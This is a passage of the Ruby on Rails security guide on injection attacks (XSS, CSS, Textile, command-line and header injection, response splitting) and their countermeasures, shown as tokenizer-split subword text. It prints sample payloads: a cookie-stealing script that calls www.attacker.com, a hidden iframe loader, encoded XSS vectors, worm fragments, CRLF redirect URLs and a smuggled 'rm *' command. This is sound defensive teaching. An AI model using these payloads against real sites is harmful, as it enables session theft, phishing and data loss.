▁In j ec t ▁this ▁any where ▁in ▁your ▁web ▁application ▁to ▁see ▁your ▁own ▁cookie ▁on ▁the ▁result ▁page :
▁< script > document . write ( document . cookie ) ; </ script >
▁For ▁an ▁attacker , ▁of ▁course , ▁this ▁is ▁not ▁useful , ▁as ▁the ▁victim ▁will ▁see ▁their ▁own ▁cookie .
▁The ▁next ▁example ▁will ▁try ▁to ▁load ▁an ▁image ▁from ▁the ▁URL ▁ http :// www . at t ac k er . com / ▁plus ▁the ▁cookie .
▁Of ▁course ▁this ▁URL ▁does ▁not ▁exist , ▁so ▁the ▁browser ▁display s ▁nothing .
▁But ▁the ▁attacker ▁can ▁review ▁their ▁web ▁server ' s ▁access ▁log ▁files ▁to ▁see ▁the ▁victim ' s ▁cookie .
▁< script > document . write (' < img ▁src =" http :// www . at t ac k er . com / ' ▁ + ▁document . cookie ▁ + ▁' "> ') ; </ script >
▁The ▁log ▁files ▁on ▁ www . at t ac k er . com ▁will ▁read ▁like ▁this :
▁GET ▁ http :// www . at t ac k er . com / _ app _ session = 8 36 c 1 c 2 5 2 78 e 5 b 3 2 1 d 6 be a 4 f 19 c b 57 e 2
▁ Http ▁only ▁cookies ▁can ▁be ▁used ▁from ▁I E ▁ v 6 .
▁S P 1, ▁Firefox ▁ v 2 . 0 . 0 . 5 ▁and ▁O p er a ▁ 9 . 5 . ▁Safari ▁is ▁ still ▁consider ing , ▁it ▁ignore s ▁the ▁option .
▁But ▁other , ▁older ▁browsers ▁( such ▁as ▁Web T V ▁and ▁I E ▁5 . 5 ▁on ▁Mac ) ▁can ▁actually ▁cause ▁the ▁page ▁to ▁fail ▁to ▁load .
▁#### # ▁De fa ce ment
▁With ▁web ▁page ▁def a ce ment ▁an ▁attacker ▁can ▁do ▁a ▁lot ▁of ▁things , ▁for ▁example , ▁present ▁false ▁information ▁or ▁ l ure ▁the ▁victim ▁on ▁the ▁attacker s ▁web ▁site ▁to ▁steal ▁the ▁cookie , ▁login ▁credentials ▁or ▁other ▁ sensitive ▁data .
▁The ▁most ▁popular ▁way ▁is ▁to ▁include ▁code ▁from ▁external ▁source s ▁by ▁i frame s :
▁< i frame ▁name =" S t at P age " ▁src =" http :// 58 . x x . x x x . x x x " ▁ width = 5 ▁he ight = 5 ▁style =" display : n one " ></ i frame >
▁This ▁load s ▁arbitrar y ▁HTML ▁and / or ▁JavaScript ▁from ▁an ▁external ▁source ▁and ▁embed s ▁it ▁as ▁part ▁of ▁the ▁site .
▁This ▁i frame ▁is ▁take n ▁from ▁an ▁actual ▁attack ▁on ▁ le git i m ate ▁It al i an ▁site s ▁using ▁the ▁[ M p ac k ▁attack ▁framework ]( http :// is c . s an s . org / d i ary . html ? s tory id = 3 0 15 ).
▁M p ac k ▁ tries ▁to ▁install ▁ malicious ▁software ▁through ▁security ▁hole s ▁in ▁the ▁web ▁browser ▁- ▁very ▁successfully , ▁50 % ▁of ▁the ▁attacks ▁succeed .
▁A ▁more ▁special ize d ▁attack ▁could ▁ overlap ▁the ▁entire ▁web ▁site ▁or ▁display ▁a ▁login ▁form , ▁which ▁look s ▁the ▁same ▁as ▁the ▁site ' s ▁original , ▁but ▁tr an s m it s ▁the ▁user ▁name ▁and ▁password ▁to ▁the ▁attacker ' s ▁site .
▁Or ▁it ▁could ▁use ▁CSS ▁and / or ▁JavaScript ▁to ▁h id e ▁a ▁ le git i m ate ▁link ▁in ▁the ▁web ▁application , ▁and ▁display ▁another ▁one ▁at ▁its ▁place ▁which ▁redirect s ▁to ▁a ▁fake ▁web ▁site .
▁Re f le c t ed ▁injection ▁attacks ▁are ▁those ▁where ▁the ▁p a y load ▁is ▁not ▁store d ▁to ▁present ▁it ▁to ▁the ▁victim ▁later ▁on , ▁but ▁included ▁in ▁the ▁URL . ▁E s pecially ▁search ▁forms ▁fail ▁to ▁escape ▁the ▁search ▁string .
▁The ▁following ▁link ▁present ed ▁a ▁page ▁which ▁state d ▁that ▁" G e org e ▁B us h ▁a p point ed ▁a ▁ 9 ▁ year ▁old ▁b o y ▁to ▁be ▁the ▁ cha ir person ..." :
▁ http :// www . c b s new s . com / st or ies / 200 2 / 02 / 15 / we ather _ local / main 50 16 44 . s html ? z ip code = 1 - - >
▁< script ▁src = http :// www . security la b . ru / test / sc . js ></ script >< ! - -
▁#### # ▁C ountermeasures
▁ _ It ▁is ▁very ▁important ▁to ▁filter ▁ malicious ▁input , ▁but ▁it ▁is ▁also ▁important ▁to ▁escape ▁the ▁output ▁of ▁the ▁web ▁application _ .
▁E s pecially ▁for ▁ X SS , ▁it ▁is ▁important ▁to ▁do ▁ _ white list ▁input ▁filter ing ▁instead ▁of ▁blacklist _ .
▁Whi t e list ▁filter ing ▁state s ▁the ▁values ▁allowed ▁as ▁oppos ed ▁to ▁the ▁values ▁not ▁allowed .
▁B la c k list s ▁are ▁ never ▁complete .
▁Imag ine ▁a ▁blacklist ▁delete s ▁" script " ▁from ▁the ▁user ▁input .
▁Now ▁the ▁attacker ▁inject s ▁" & lt ; sc r script ip t & gt ; ", ▁and ▁after ▁the ▁filter , ▁" & lt ; script & gt ; " ▁remain s .
▁E ar li er ▁versions ▁of ▁Rails ▁used ▁a ▁blacklist ▁approach ▁for ▁the ▁ str ip _ tag s ( ), ▁ str ip _ links ( ) ▁and ▁ sanitize ( ) ▁method .
▁So ▁this ▁kind ▁of ▁injection ▁was ▁possible :
▁ str ip _ tag s (" some < < b > script > alert (' hello ' )< </ b > / script > ")
▁This ▁returned ▁" some & lt ; script & gt ; alert (' hello ') & lt ; / script & gt ; ", ▁which ▁make s ▁an ▁attack ▁work .
▁tags ▁= ▁% w ( a ▁ acronym ▁b ▁ strong ▁i ▁ em ▁ li ▁ ul ▁ ol ▁h 1 ▁h 2 ▁h 3 ▁h 4 ▁h 5 ▁h 6 ▁block quot e ▁ br ▁c ite ▁sub ▁ s up ▁in s ▁p )
▁ s ▁= ▁ sanitize ( user _ input , ▁tags : ▁tags , ▁attributes : ▁% w ( href ▁title ) )
▁This ▁allows ▁only ▁the ▁given ▁tags ▁and ▁does ▁a ▁good ▁job , ▁even ▁again st ▁all ▁kind s ▁of ▁trick s ▁and ▁m al form ed ▁tags .
▁As ▁a ▁second ▁step , ▁ _ it ▁is ▁good ▁practice ▁to ▁escape ▁all ▁output ▁of ▁the ▁application _ , ▁es pecially ▁when ▁re - display ing ▁user ▁input , ▁which ▁has n ' t ▁been ▁input - filter ed ▁( as ▁in ▁the ▁search ▁form ▁example ▁earlier ▁on ).
▁ _ U se ▁` escape HTML ( )` ▁( or ▁its ▁alias ▁` h ( ) `) ▁method _ ▁to ▁replace ▁the ▁HTML ▁input ▁characters ▁ & am p ; , ▁ & quot ; , ▁ & lt ; , ▁ & gt ; ▁by ▁their ▁un in ter pre t ed ▁representation s ▁in ▁HTML ▁( ` & am p ; `, ▁` & quot ; `, ▁` & lt ` ; , ▁and ▁` & gt ; ` ).
▁Safe E rb ▁remind s ▁you ▁to ▁escape ▁strings ▁from ▁external ▁source s .
▁#### # ▁O b f us c ation ▁and ▁ Encoding ▁Injection
▁N et work ▁traffic ▁is ▁most ly ▁base d ▁on ▁the ▁ limited ▁We s ter n ▁ al ph a be t , ▁so ▁new ▁character ▁encoding s , ▁such ▁as ▁Un i code , ▁e merge d , ▁to ▁tr an s m it ▁characters ▁in ▁other ▁languages .
▁But , ▁this ▁is ▁also ▁a ▁thr e at ▁to ▁web ▁applications , ▁as ▁ malicious ▁code ▁can ▁be ▁hidden ▁in ▁different ▁encoding s ▁that ▁the ▁web ▁browser ▁m ight ▁be ▁able ▁to ▁process , ▁but ▁the ▁web ▁application ▁m ight ▁not .
▁Here ▁is ▁an ▁attack ▁ ve c to r ▁in ▁ UT F -8 ▁encoding :
▁< I M G ▁S R C = & # 1 06 ; & # 9 7 ; & # 1 18 ; & # 9 7 ; & # 11 5 ; & # 99 ; & # 11 4 ; & # 10 5 ; & # 1 12 ; & # 1 16 ; & # 58 ; & # 9 7 ;
▁ & # 1 08 ; & # 10 1 ; & # 11 4 ; & # 1 16 ; & # 4 0 ; & # 39 ; & # 88 ; & # 8 3 ; & # 8 3 ; & # 39 ; & # 4 1 ; >
▁This ▁example ▁p o p s ▁up ▁a ▁message ▁box .
▁It ▁will ▁be ▁recognize d ▁by ▁the ▁above ▁ sanitize ( ) ▁filter , ▁though .
▁A ▁great ▁tool ▁to ▁ ob f us c ate ▁and ▁ en code ▁strings , ▁and ▁thus ▁" get ▁to ▁know ▁your ▁ en e my ", ▁is ▁the ▁[ H ac k ve r to r ]( https :// h ac k ve r to r . co . u k / public ).
▁Rails ' ▁ sanitize ( ) ▁method ▁does ▁a ▁good ▁job ▁to ▁f end ▁off ▁encoding ▁attacks .
▁#### ▁Example s ▁from ▁the ▁Under ground
▁ _ In ▁order ▁to ▁understand ▁to day ' s ▁attacks ▁on ▁web ▁applications , ▁it ' s ▁best ▁to ▁take ▁a ▁look ▁at ▁some ▁real - world ▁attack ▁ ve c to r s .
▁The ▁following ▁is ▁an ▁ ex c er p t ▁from ▁the ▁[ J s . Y am an n er @ m ]( http :// www . s ymantec . com / security _ response / write up . js p ? doc id = 200 6 - 06 12 11 - 4 1 11 - 99 & t a b id = 1 ) ▁ Y a h oo ! ▁ Mail ▁[ w or m ]( http :// gr oo v in . net / stuff / y am m er . t x t ).
▁It ▁appear ed ▁on ▁Jun e ▁ 11 , ▁200 6 ▁and ▁was ▁the ▁first ▁web mail ▁interface ▁worm :
▁< img ▁src =' http :// us . i 1 . y img . com / us . y img . com / i / us / n t / ma / ma _ mail _ 1 . g if '
▁target =" " on load =" v ar ▁ http _ request ▁= ▁false ; ▁var ▁Email ▁= ▁ '' ;
▁var ▁ ID L ist ▁= ▁ '' ; ▁var ▁C R um b ▁= ▁ '' ; ▁function ▁make Request ( url , ▁F un c , ▁ Method , P ar am ) ▁ { ▁...
▁The ▁worm s ▁ exploit s ▁a ▁hole ▁in ▁ Y a h oo ' s ▁HTML / JavaScript ▁filter , ▁which ▁usually ▁filter s ▁all ▁target ▁and ▁on load ▁attributes ▁from ▁tags ▁( because ▁there ▁can ▁be ▁JavaScript ).
▁The ▁filter ▁is ▁applied ▁only ▁once , ▁however , ▁so ▁the ▁on load ▁attribute ▁with ▁the ▁worm ▁code ▁sta y s ▁in ▁place .
▁This ▁is ▁a ▁good ▁example ▁why ▁blacklist ▁filter s ▁are ▁ never ▁complete ▁and ▁why ▁it ▁is ▁hard ▁to ▁allow ▁HTML / JavaScript ▁in ▁a ▁web ▁application .
▁A nother ▁ proof - of - concept ▁web mail ▁worm ▁is ▁N d u j a , ▁a ▁c ross - domain ▁worm ▁for ▁four ▁It al i an ▁web mail ▁ service s .
▁Find ▁more ▁details ▁on ▁[ R o s ar io ▁ V al o tt a ' s ▁ paper ]( http :// www . x s s ed . com / new s / 37 / N d u j a _ Connection _ A _ c ross _ web mail _ w or m _ X W W / ).
▁Bo th ▁web mail ▁worm s ▁have ▁the ▁goal ▁to ▁ha r ve st ▁email ▁addresses , ▁something ▁a ▁c r i m in al ▁ha c k er ▁could ▁make ▁m one y ▁with .
▁In ▁De ce m b er ▁200 6 , ▁ 34 , 000 ▁actual ▁user ▁names ▁and ▁passwords ▁were ▁stolen ▁in ▁a ▁[ M y Space ▁ ph is h ing ▁attack ]( http :// new s . net craft . com / archive s / 200 6 / 10 / 27 / my space _ account s _ com promised _ by _ ph is h ers . html ).
▁The ▁idea ▁of ▁the ▁attack ▁was ▁to ▁create ▁a ▁profile ▁page ▁named ▁" login _ home _ index _ html ", ▁so ▁the ▁URL ▁look ed ▁very ▁con v in c ing .
▁S pecially - craft ed ▁HTML ▁and ▁CSS ▁was ▁used ▁to ▁h id e ▁the ▁g en u ine ▁My Space ▁content ▁from ▁the ▁page ▁and ▁instead ▁display ▁its ▁own ▁login ▁form .
▁The ▁My Space ▁S am y ▁worm ▁will ▁be ▁discuss ed ▁in ▁the ▁CSS ▁Injection ▁section .
▁### ▁CSS ▁Injection
▁INFO : ▁ _ CSS ▁Injection ▁is ▁actually ▁JavaScript ▁injection , ▁because ▁some ▁browsers ▁( I E , ▁some ▁versions ▁of ▁Safari ▁and ▁other s ) ▁allow ▁JavaScript ▁in ▁CSS . ▁T h in k ▁t w ic e ▁about ▁allow ing ▁custom ▁CSS ▁in ▁your ▁web ▁application .
▁CSS ▁Injection ▁is ▁explained ▁best ▁by ▁a ▁well - k now n ▁worm , ▁the ▁[ M y Space ▁S am y ▁worm ]( http :// n am b . la / p o p ul ar / tech . html ).
▁This ▁worm ▁automatically ▁sent ▁a ▁friend ▁request ▁to ▁S am y ▁( the ▁attacker ) ▁simply ▁by ▁visit ing ▁his ▁profile .
▁With in ▁sever al ▁hours ▁he ▁ha d ▁over ▁1 ▁m i ll ion ▁friend ▁requests , ▁but ▁it ▁creates ▁too ▁much ▁traffic ▁on ▁My Space , ▁so ▁that ▁the ▁site ▁go es ▁off line .
▁The ▁following ▁is ▁a ▁technical ▁ ex p la n ation ▁of ▁the ▁worm .
▁My Space ▁blocks ▁many ▁tags , ▁however ▁it ▁allows ▁CSS . ▁So ▁the ▁worm ' s ▁author ▁put ▁JavaScript ▁into ▁CSS ▁like ▁this :
▁< div ▁style =" back ground : url (' javascript : alert (1) ') ">
▁So ▁the ▁p a y load ▁is ▁in ▁the ▁style ▁attribute .
▁But ▁there ▁are ▁no ▁ quot es ▁allowed ▁in ▁the ▁p a y load , ▁because ▁single ▁and ▁double ▁ quot es ▁have ▁already ▁been ▁used .
▁But ▁JavaScript ▁has ▁a ▁hand y ▁ eval ( ) ▁function ▁which ▁execute s ▁any ▁string ▁as ▁code .
▁< div ▁id =" my code " ▁ ex p r =" alert (' ha h ! ') "
▁style =" back ground : url (' javascript : eval ( document . all . my code . ex p r ) ') ">
▁The ▁ eval ( ) ▁function ▁is ▁a ▁ n ight ma re ▁for ▁blacklist ▁input ▁filter s , ▁as ▁it ▁allows ▁the ▁style ▁attribute ▁to ▁h id e ▁the ▁word ▁" in n er HTML " :
▁ alert ( eval (' document . body . in n e ' ▁ + ▁' r HTML ') ) ;
▁The ▁next ▁problem ▁was ▁My Space ▁filter ing ▁the ▁word ▁" javascript ", ▁so ▁the ▁author ▁used ▁" j a v a & lt ; N E W L IN E & gt ; script " ▁to ▁get ▁around ▁this :
▁A nother ▁problem ▁for ▁the ▁worm ' s ▁author ▁were ▁CSRF ▁security ▁token s .
▁With out ▁them ▁he ▁could n ' t ▁send ▁a ▁friend ▁request ▁over ▁POST .
▁H e ▁go t ▁around ▁it ▁by ▁sending ▁a ▁GET ▁to ▁the ▁page ▁right ▁before ▁adding ▁a ▁user ▁and ▁pars ing ▁the ▁result ▁for ▁the ▁CSRF ▁token .
▁In ▁the ▁end , ▁he ▁go t ▁a ▁4 ▁ K B ▁worm , ▁which ▁he ▁inject ed ▁into ▁his ▁profile ▁page .
▁The ▁[ m o z - bin d ing ]( http :// www . sec ur ite am . com / security new s / 5 L P 0 5 1 F H P E . html ) ▁CSS ▁property ▁pro ve d ▁to ▁be ▁another ▁way ▁to ▁introduce ▁JavaScript ▁in ▁CSS ▁in ▁G ec k o - base d ▁browsers ▁( F i ref o x , ▁for ▁example ).
▁This ▁example , ▁again , ▁show ed ▁that ▁a ▁blacklist ▁filter ▁is ▁ never ▁complete .
▁ _ If ▁you ▁want ▁to ▁allow ▁custom ▁color s ▁or ▁images , ▁you ▁can ▁allow ▁the ▁user ▁to ▁choose ▁them ▁and ▁build ▁the ▁CSS ▁in ▁the ▁web ▁application _ .
▁Use ▁Rails ' ▁` sanitize ( )` ▁method ▁as ▁a ▁model ▁for ▁a ▁ white list ▁CSS ▁filter , ▁if ▁you ▁really ▁need ▁one .
▁### ▁Text i le ▁Injection
▁If ▁you ▁want ▁to ▁provide ▁text ▁format ting ▁other ▁than ▁HTML ▁( d ue ▁to ▁security ), ▁use ▁a ▁mark - up ▁language ▁which ▁is ▁convert ed ▁to ▁HTML ▁on ▁the ▁server - side .
▁[ RedCloth ]( http :// r ed c lo th . org / ) ▁is ▁such ▁a ▁language ▁for ▁Ruby , ▁but ▁without ▁precaution s , ▁it ▁is ▁also ▁vulnerable ▁to ▁ X SS .
▁For ▁example , ▁ RedCloth ▁tr an s l ate s ▁` _ test _ ` ▁to ▁ & lt ; em & gt ; test & lt ; em & gt ; , ▁which ▁make s ▁the ▁text ▁it al ic .
▁However , ▁up ▁to ▁the ▁current ▁version ▁3.0 . 4 , ▁it ▁is ▁ still ▁vulnerable ▁to ▁ X SS .
▁G et ▁the ▁[ all - new ▁version ▁4 ]( http :// www . r ed c lo th . org ) ▁that ▁removed ▁serious ▁bug s .
▁However , ▁even ▁that ▁version ▁has ▁[ some ▁security ▁bug s ]( http :// www . r or security . info / j our n al / 200 8 / 10 /1 3 / new - r ed c lo th - security . html ), ▁so ▁the ▁countermeasure s ▁ still ▁apply .
▁Here ▁is ▁an ▁example ▁for ▁version ▁3.0 . 4 :
▁ RedCloth . new (' < script > alert (1) </ script > ' ). to _ html
▁# ▁=> ▁" < script > alert (1) </ script > "
▁Use ▁the ▁: filter _ html ▁option ▁to ▁remove ▁HTML ▁which ▁was ▁not ▁created ▁by ▁the ▁Text i le ▁process or .
▁ RedCloth . new (' < script > alert (1) </ script > ' , ▁[ : filter _ html ]) . to _ html
▁# ▁=> ▁" alert (1) "
▁However , ▁this ▁does ▁not ▁filter ▁all ▁HTML , ▁a ▁few ▁tags ▁will ▁be ▁left ▁( by ▁design ), ▁for ▁example ▁ & lt ; a & gt ; :
▁ RedCloth . new (" < a ▁ href =' javascript : alert (1) ' > hello </ a > ", ▁[ : filter _ html ]) . to _ html
▁# ▁=> ▁" < p >< a ▁ href =" javascript : alert (1) "> hello </ a ></ p > "
▁It ▁is ▁recommended ▁to ▁ _ use ▁ RedCloth ▁in ▁combination ▁with ▁a ▁ white list ▁input ▁filter _ , ▁as ▁describe d ▁in ▁the ▁countermeasure s ▁again st ▁ X SS ▁section .
▁### ▁Ajax ▁Injection
▁NOTE : ▁ _ The ▁same ▁security ▁precaution s ▁have ▁to ▁be ▁take n ▁for ▁Ajax ▁actions ▁as ▁for ▁" normal " ▁one s .
▁There ▁is ▁at ▁least ▁one ▁exception , ▁however : ▁The ▁output ▁has ▁to ▁be ▁escape d ▁in ▁the ▁controller ▁already , ▁if ▁the ▁action ▁does n ' t ▁render ▁a ▁view .
▁Otherwise , ▁if ▁the ▁return ▁value ▁contains ▁a ▁ X SS ▁string , ▁the ▁ malicious ▁code ▁will ▁be ▁executed ▁upon ▁return ▁to ▁the ▁browser .
▁E sc ap e ▁any ▁input ▁value ▁using ▁the ▁h ( ) ▁method .
▁### ▁Co m m and ▁L ine ▁Injection
▁NOTE : ▁ _ U se ▁user - s up p li ed ▁command ▁line ▁parameters ▁with ▁caution .
▁If ▁your ▁application ▁has ▁to ▁execute ▁commands ▁in ▁the ▁under ly ing ▁operat ing ▁system , ▁there ▁are ▁sever al ▁methods ▁in ▁Ruby : ▁exec ( command ), ▁ s y sc all ( command ), ▁system ( command ) ▁and ▁` command `.
▁You ▁will ▁have ▁to ▁be ▁es pecially ▁careful ▁with ▁these ▁functions ▁if ▁the ▁user ▁may ▁enter ▁the ▁whole ▁command , ▁or ▁a ▁part ▁of ▁it .
▁This ▁is ▁because ▁in ▁most ▁ s hel l s , ▁you ▁can ▁execute ▁another ▁command ▁at ▁the ▁end ▁of ▁the ▁first ▁one , ▁ concat en at ing ▁them ▁with ▁a ▁semi co lo n ▁( ; ) ▁or ▁a ▁vertical ▁bar ▁( | ).
▁A ▁countermeasure ▁is ▁to ▁ _ use ▁the ▁` system ( command , ▁parameters )` ▁method ▁which ▁passes ▁command ▁line ▁parameters ▁safe ly _ .
▁system (" / bin / e ch o ", " hello ; ▁ rm ▁* ")
▁# ▁ print s ▁" hello ; ▁ rm ▁* " ▁and ▁does ▁not ▁delete ▁files
▁### ▁Header ▁Injection
▁WARNING : ▁ _ HTTP ▁headers ▁are ▁dynamic ally ▁generated ▁and ▁under ▁certain ▁c ir c um st ance s ▁user ▁input ▁may ▁be ▁inject ed .
▁This ▁can ▁lead ▁to ▁false ▁redirect ion , ▁ X SS ▁or ▁HTTP ▁response ▁ split ting .
▁HTTP ▁request ▁headers ▁have ▁a ▁Re f er er , ▁User - A g ent ▁( client ▁software ), ▁and ▁Co o k i e ▁field , ▁a mong ▁other s .
▁ Response ▁headers ▁for ▁example ▁have ▁a ▁status ▁code , ▁Co o k i e ▁and ▁ Location ▁( redirect ion ▁target ▁URL ) ▁field .
▁All ▁of ▁them ▁are ▁user - s up p li ed ▁and ▁may ▁be ▁manipulate d ▁with ▁more ▁or ▁less ▁effort .
▁ _ Re member ▁to ▁escape ▁these ▁header ▁fields , ▁too .
▁ _ ▁For ▁example ▁when ▁you ▁display ▁the ▁user ▁a g ent ▁in ▁an ▁administrati on ▁are a .
▁Be side s ▁that , ▁it ▁is ▁ _ import ant ▁to ▁know ▁what ▁you ▁are ▁doing ▁when ▁build ing ▁response ▁headers ▁part ly ▁base d ▁on ▁user ▁input .
▁ _ ▁For ▁example ▁you ▁want ▁to ▁redirect ▁the ▁user ▁back ▁to ▁a ▁specific ▁page .
▁To ▁do ▁that ▁you ▁introduce d ▁a ▁" ref er er " ▁field ▁in ▁a ▁form ▁to ▁redirect ▁to ▁the ▁given ▁address :
▁redirect _ to ▁params [: ref er er ]
▁What ▁happens ▁is ▁that ▁Rails ▁put s ▁the ▁string ▁into ▁the ▁ Location ▁header ▁field ▁and ▁send s ▁a ▁30 2 ▁( redirect ) ▁status ▁to ▁the ▁browser .
▁The ▁first ▁thing ▁a ▁ malicious ▁user ▁would ▁do , ▁is ▁this :
▁ http :// www . your application . com / controller / action ? ref er er = http :// www . malicious . tld
▁And ▁due ▁to ▁a ▁bug ▁in ▁( Ruby ▁and ) ▁Rails ▁up ▁to ▁version ▁2.1. 2 ▁( ex c l u d ing ▁it ), ▁a ▁ha c k er ▁may ▁inject ▁arbitrar y ▁header ▁fields ; ▁for ▁example ▁like ▁this :
▁ http :// www . your application . com / controller / action ? ref er er = http :// www . malicious . tld % 0 d % 0 a X - Head er : + H i !
▁ http :// www . your application . com / controller / action ? ref er er = path / at / your / app % 0 d % 0 a Location : + http :// www . malicious . tld
▁Note ▁that ▁" % 0 d % 0 a " ▁is ▁URL - en code d ▁for ▁" \ r \ n " ▁which ▁is ▁a ▁c ar r i age - return ▁and ▁line - feed ▁( C R L F ) ▁in ▁Ruby .
▁So ▁the ▁result ing ▁HTTP ▁header ▁for ▁the ▁second ▁example ▁will ▁be ▁the ▁following ▁because ▁the ▁second ▁ Location ▁header ▁field ▁overwrit es ▁the ▁first .
▁HTTP /1.1 ▁30 2 ▁Mo ve d ▁T emporarily
▁ (...)
▁ Location : ▁ http :// www . malicious . tld
▁So ▁ _ at t ac k ▁ ve c to r s ▁for ▁Header ▁Injection ▁are ▁base d ▁on ▁the ▁injection ▁of ▁C R L F ▁characters ▁in ▁a ▁header ▁field .
▁ _ ▁And ▁what ▁could ▁an ▁attacker ▁do ▁with ▁a ▁false ▁redirect ion ?
▁They ▁could ▁redirect ▁to ▁a ▁ ph is h ing ▁site ▁that ▁look s ▁the ▁same ▁as ▁your s , ▁but ▁as k ▁to ▁login ▁again ▁( and ▁send s ▁the ▁login ▁credentials ▁to ▁the ▁attacker ).
▁Or ▁they ▁could ▁install ▁ malicious ▁software ▁through ▁browser ▁security ▁hole s ▁on ▁that ▁site .
▁Rails ▁2.1. 2 ▁escape s ▁these ▁characters ▁for ▁the ▁ Location ▁field ▁in ▁the ▁` redirect _ to ` ▁method .
▁ _ Make ▁sure ▁you ▁do ▁it ▁yourself ▁when ▁you ▁build ▁other ▁header ▁fields ▁with ▁user ▁input .
▁#### ▁ Response ▁S p li tt ing
▁If ▁Header ▁Injection ▁was ▁possible , ▁ Response ▁S p li tt ing ▁m ight ▁be , ▁too .
▁In ▁HTTP , ▁the ▁header ▁block ▁is ▁followed ▁by ▁two ▁C R L F s ▁and ▁the ▁actual ▁data ▁( us u ally ▁HTML ).
▁The ▁idea ▁of ▁ Response ▁S p li tt ing ▁is ▁to ▁inject ▁two ▁C R L F s ▁into ▁a ▁header ▁field , ▁followed ▁by ▁another ▁response ▁with ▁ malicious ▁HTML .
▁The ▁response ▁will ▁be :
▁HTTP /1.1 ▁30 2 ▁F ound ▁[ First ▁standard ▁30 2 ▁response ]
▁Date : ▁Tue , ▁ 12 ▁Apr ▁200 5 ▁ 22 : 0 9 : 07 ▁GMT
▁ Content - Type : ▁text / html
▁HTTP /1.1 ▁200 ▁O K ▁[ S ec on d ▁ New ▁response ▁created ▁by ▁attacker ▁begin s ]
▁ & lt ; html & gt ; & lt ; f on t ▁color = r ed & gt ; h e y & lt ; / f on t & gt ; & lt ; / html & gt ; ▁[ A rb it ary ▁ malicious ▁input ▁is
▁ K eep - A li ve : ▁time out = 15 , ▁ ma x = 1 00 ▁show n ▁as ▁the ▁redirect ed ▁page ]
▁ Connection : ▁ K eep - A li ve
▁ Transfer - Encoding : ▁ ch un k ed
▁Under ▁certain ▁c ir c um st ance s ▁this ▁would ▁present ▁the ▁ malicious ▁HTML ▁to ▁the ▁victim .
▁However , ▁this ▁only ▁seem s ▁to ▁work ▁with ▁ K eep - A li ve ▁connection s ▁( and ▁many ▁browsers ▁are ▁using ▁one - time ▁connection s ).
▁But ▁you ▁can ' t ▁rely ▁on ▁this .
▁ _ In ▁any ▁case ▁this ▁is ▁a ▁serious ▁bug , ▁and ▁you ▁should ▁update ▁your ▁Rails ▁to ▁version ▁2 . 0 . 5 ▁or ▁2.1. 2 ▁to ▁eliminate ▁Header ▁Injection ▁( and ▁thus ▁response ▁ split ting ) ▁risk s .
▁Un safe ▁ Query ▁Generat ion
▁-------------- ---------
▁D ue ▁to ▁the ▁way ▁Active ▁Record ▁interpret s ▁parameters ▁in ▁combination ▁with ▁the ▁way < n > that ▁Rack ▁pars es ▁query ▁parameters ▁it ▁was ▁possible ▁to ▁issue ▁un expected ▁database < n > q u er ies ▁with ▁` I S ▁NULL ` ▁where ▁clause s .
▁As ▁a ▁response ▁to ▁that ▁security ▁issue < n > ( [ C V E - 20 12 - 2 6 60 ]( https :// groups . google . com / for um / # ! search in / rubyonrails - security / deep _ munge / rubyonrails - security / 8 S A - M 3 as 7 A 8 / M r 9 fi 9 X 4 k N g J ), < n >[ C V E - 20 12 - 2 6 9 4 ]( https :// groups . google . com / for um / # ! search in / rubyonrails - security / deep _ munge / rubyonrails - security / j I L Z 34 t A H F 4 / 7 x 0 h L H - o 0 - I J )< n > and ▁[ C V E - 20 1 3- 0 15 5 ]( https :// groups . google . com / for um / # ! search in / rubyonrails - security / C V E - 20 12 - 2 6 60 / rubyonrails - security / c 7 j T - E e N 9 e I / L 0 u 4 e 87 z Y G M J ) )< n >` deep _ munge ` ▁method ▁was ▁introduce d ▁as ▁a ▁solution ▁to ▁keep ▁Rails ▁secure ▁by ▁default .
▁Example ▁of ▁vulnerable ▁code ▁that ▁could ▁be ▁used ▁by ▁attacker , ▁if ▁` deep _ munge `< n > w as n ' t ▁perform ed ▁is :
▁unless ▁params [: token ] . nil ?
▁user ▁= ▁User . find _ by _ token ( params [: token ])
▁user . reset _ password !
▁When ▁` params [: token ]` ▁is ▁one ▁of : ▁` [ ]` , ▁` [ nil ]` , ▁` [ nil , ▁nil , ▁... ]` ▁or < n >` [' foo ' , ▁nil ]` ▁it ▁will ▁bypass ▁the ▁test ▁for ▁` nil `, ▁but ▁` I S ▁NULL ` ▁or < n >` IN ▁( ' foo ' , ▁NULL )` ▁where ▁clause s ▁ still ▁will ▁be ▁added ▁to ▁the ▁SQL ▁query .
▁To ▁keep ▁rails ▁secure ▁by ▁default , ▁` deep _ munge ` ▁replace s ▁some ▁of ▁the ▁values ▁with < n >` nil `.
▁Be low ▁table ▁shows ▁what ▁the ▁parameters ▁look ▁like ▁base d ▁on ▁` JSON ` ▁sent ▁in < n > request :
▁| ▁JSON ▁| ▁P ar am et ers ▁|
▁| --- ---------------- ---------------- | ------------- ------------- |
▁| ▁` { ▁" person " : ▁ null ▁}` ▁| ▁` { ▁: person ▁=> ▁nil ▁}` ▁|
▁| ▁` { ▁" person " : ▁[] ▁}` ▁| ▁` { ▁: person ▁=> ▁nil ▁}` ▁|
▁| ▁` { ▁" person " : ▁[ null ] ▁}` ▁| ▁` { ▁: person ▁=> ▁nil ▁}` ▁|
▁| ▁` { ▁" person " : ▁[ null , ▁ null , ▁... ] ▁}` ▁| ▁` { ▁: person ▁=> ▁nil ▁}` ▁|
▁| ▁` { ▁" person " : ▁[" foo ", ▁ null ] ▁}` ▁| ▁` { ▁: person ▁=> ▁[" foo "] ▁}` ▁|
▁It ▁is ▁possible ▁to ▁return ▁to ▁old ▁be ha v i our ▁and ▁disable ▁` deep _ munge ` ▁ configuring < n > your ▁application ▁if ▁you ▁are ▁a w a re ▁of ▁the ▁risk ▁and ▁know ▁how ▁to ▁handle ▁it :
▁config . action _ dispatch . perform _ deep _ munge ▁= ▁false
▁Default ▁Header s
▁Every ▁HTTP ▁response ▁from ▁your ▁Rails ▁application ▁receive s ▁the ▁following ▁default ▁security ▁headers .
▁config . action _ dispatch . default _ header s ▁= ▁ {
▁' X - Frame - Options ' ▁=> ▁' S A ME O R I G IN ' ,
▁' X - X SS - Pro t ection ' ▁=> ▁' 1 ; ▁mode = block ' ,
▁' X - Content - Type - Options ' ▁=> ▁' no s n if f '
▁You ▁can ▁configure ▁default ▁headers ▁in ▁` config / application . rb `.
▁' Head er - Name ' ▁=> ▁' Head er - V al ue ' ,
▁' X - Frame - Options ' ▁=> ▁' D E N Y '
▁Or ▁you ▁can ▁remove ▁them .
▁config . action _ dispatch . default _ header s . clear
